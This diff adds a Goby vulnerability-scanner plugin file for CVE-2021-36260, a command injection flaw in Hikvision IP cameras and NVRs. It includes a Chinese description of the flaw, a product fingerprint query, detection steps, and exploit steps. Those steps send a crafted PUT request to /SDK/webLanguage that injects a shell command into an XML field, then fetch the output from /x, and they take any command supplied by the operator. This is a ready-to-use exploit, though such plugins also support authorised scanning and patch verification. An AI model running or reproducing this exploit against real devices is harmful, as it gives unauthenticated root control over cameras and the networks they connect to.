@@ -1,0 +1,162 @@
+{
+      "Name": "Hikvision-Unauthenticated-RCE-CVE-2021-36260",
+      "Level": "3",
+      "Tags": [
+            "rce"
+      ],
+      "GobyQuery": "product=\"Hikvision-Cameras-and-Surveillance\"",
+      "Description": "海康威视部分产品中的web模块存在一个命令注入漏洞，由于对输入参数校验不充分，攻击者可以发送带有恶意命令的报文到受影响设备，成功利用此漏洞可以导致命令执行。海康威视已发布版本修复该漏洞。",
+      "Product": "https://www.hikvision.com/cn/",
+      "Homepage": "https://gobies.org/",
+      "Author": "gobysec@gmail.com",
+      "Impact": "<p>一个影响大量海康威视摄像机的零点击未经身份验证的远程代码执行 (RCE) 漏洞。连接的内部网络面临风险海康威视 IP 摄像机/NVR 固件中的未经身份验证的远程代码执行 (RCE) 漏洞 (CVE-2021-36260)</p><p>这允许攻击者通过不受限制的 root shell 获得对设备的完全控制，这比设备所有者拥有的访问权限要多得多，因为他们被限制在有限的“受保护的 shell”（psh）中，它将输入过滤到预定义的集合有限的，主要是信息性命令。这是最高级别的严重漏洞<br></p>",
+      "Recommendation": "<p>升级版本</p><p>如升级失败，可点击&nbsp;<a href>在线客服</a>(<a href>https://scc-chat.hikvision.com/yc-media/pages/web-client.jsp?entId=1001&amp;channelKey=mimahuifubaobei&amp;keyCode=1&amp;language=zh-CN</a>)获取帮助<br></p>",
+      "References": [
+            "https://gobies.org/"
+      ],
+      "HasExp": true,
+      "ExpParams": [
+            {
+                  "Name": "cmd",
+                  "Type": "input",
+                  "Value": "echo 81dc9bdb52d04dc20036dbd8313ed055"
+            }
+      ],
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "PUT",
+                        "uri": "/SDK/webLanguage",
+                        "follow_redirect": true,
+                        "header": {
+                              "Accept-Encoding": "gzip, deflate",
+                              "X-Requested-With": "XMLHttpRequest",
+                              "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
+                        },
+                        "data_type": "text",
+                        "data": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><language>$(echo 81dc9bdb52d04dc20036dbd8313ed055 >webLib/x)</language>",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "500",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody||"
+                  ]
+            },
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/x",
+                        "follow_redirect": true,
+                        "header": {
+                              "Content-Type": "application/json;charset=utf-8"
+                        },
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "81dc9bdb52d04dc20036dbd8313ed055",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|"
+                  ]
+            }
+      ],
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "PUT",
+                        "uri": "/SDK/webLanguage",
+                        "follow_redirect": true,
+                        "header": {
+                              "Accept-Encoding": "gzip, deflate",
+                              "X-Requested-With": "XMLHttpRequest",
+                              "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
+                        },
+                        "data_type": "text",
+                        "data": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><language>$({{{cmd}}} >webLib/x)</language>",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "500",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            },
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/x",
+                        "follow_redirect": true,
+                        "header": {
+                              "Content-Type": "application/json;charset=utf-8"
+                        },
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody||"
+                  ]
+            }
+      ],
+      "PostTime": "2021-11-10 09:04:43",
+      "GobyVersion": "1.9.307"
+}
